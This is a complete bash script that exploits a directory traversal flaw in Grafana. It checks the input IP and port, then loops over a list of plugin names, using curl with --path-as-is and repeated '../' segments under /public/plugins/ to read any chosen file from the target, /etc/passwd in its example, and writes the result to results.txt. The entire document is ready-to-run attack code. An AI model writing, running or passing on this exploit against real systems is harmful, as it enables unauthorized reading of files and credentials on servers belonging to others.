#!/bin/bash

# Set command line inputs as global variables

ip=$1
plugin_file=$2
path_to_file=$3
port=$4

# Check all required parameters were provided

parameter_existance_check() {
    if [[ -z $ip || -z $plugin_file || -z $path_to_file ]]; then
        echo -e "\nPlease provide a valid IP address, plugin file, and a path to a target file\n"
        echo -e "If grafana is not running on port 3000, add the port number as the 4th parameter\n"
        echo -e "\tUsage: ./grafana.sh <ip> <plugin file> <file path> <port # optional>\n"
        echo -e "\tExample: ./grafana.sh 10.10.10.10 plugins.txt /etc/passwd"
        exit 3
    elif [ -z $port ]; then
        echo -e "\n[+] Default port 3000 will be used\n"
        port=3000
    fi
}

# Check all parameter values are valid

parameter_value_check() {
    if [[ ! $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        echo "Error: please provide a valid IPv4 address"
        exit 3
    elif [[ $port -gt 65535 || $port -lt 0 ]]; then
        echo "Error: please provide a valid port number"
        exit 3
    fi
}

# Directory traversal attack

directory_traversal_attack() {
    for plugin in $(cat $plugin_file)
    do
        timeout 5 curl -w "\nresponse code: %{response_code}" -s --path-as-is http://$ip:$port/public/plugins/$plugin/../../../../../../../../..$path_to_file > results.txt
        if [ $? -ne 0 ]; then
	        echo "Error: Network error, ensure host can communicate with target"
            exit 3	
        fi

        if grep -i -q -E "Could not find plugin file|Plugin not found|Plugin file not found" results.txt || grep -i -q "response code: 404" results.txt; then
            continue
        elif grep -i -q "response code: 200" results.txt; then
            curl -s --path-as-is http://$ip:$port/public/plugins/$plugin/../../../../../../../../..$path_to_file > results.txt
            cat results.txt
            echo -e "\n[+] Success! file saved to results.txt"
            exit 3
        fi
    done

    echo "[+] Exploit unsuccessfull, ensure target is vulnerable"
}

parameter_existance_check
parameter_value_check
directory_traversal_attack
